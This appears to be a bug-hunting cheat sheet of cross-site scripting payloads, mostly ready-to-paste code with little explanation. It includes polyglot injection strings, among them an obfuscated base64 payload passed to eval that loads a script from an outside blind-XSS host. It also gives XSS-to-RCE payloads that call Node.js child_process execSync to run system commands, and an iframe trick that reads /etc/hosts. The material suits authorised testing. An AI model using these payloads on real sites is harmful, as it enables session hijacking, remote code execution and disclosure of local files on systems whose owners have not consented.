# XSS

### Scope:
```
GET|POST parameters
Path
```

### Detect reflections

past some keyword for detecting reflections in response like ```PayloadHere``` and send request.
search in response keyword ```PayloadHere```
if keyword reflected than past xss payloads.

### XSS Polyglots:
```
%3C!%27/*!%22/*!\%27/*\%22/* — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm`1`%20//%3E#
```
```
<!'/*!”/*!\'/*\"/* — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`1` //>#
```
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
```
">><marquee><img src=x onerror=confirm(1)></marquee>” ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” >
"></script><script>alert(1)</script>”><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'">"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```
```
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```
```
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))// →</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```
### From XSS to RCE

From xss to rce payload for nodejs application

```
<TagName EventHandler="require('child_process').execSync('calc.exe')">
```
or for Linux

```
<TagName EventHandler="require('child_process').exec('gnome-
calculator');">
```

#### Credit: @h4x0r_fr34k

Windows Payload:

```
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">
```

Linux & MacOS Payloads:
```
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```

Reading an Internal File (Local File Disclosure via XSS):
```
<br><BR><BR><BR>
<h1>pwnbr</h1>
<iframe onload=j() src="/etc/hosts">xssxssxss</iframe>
<script type="text/javascript">
    function j(){alert('pwned contents of /etc/hosts :\n\n'+frames[0].document.body.innerText)}
</script>
```


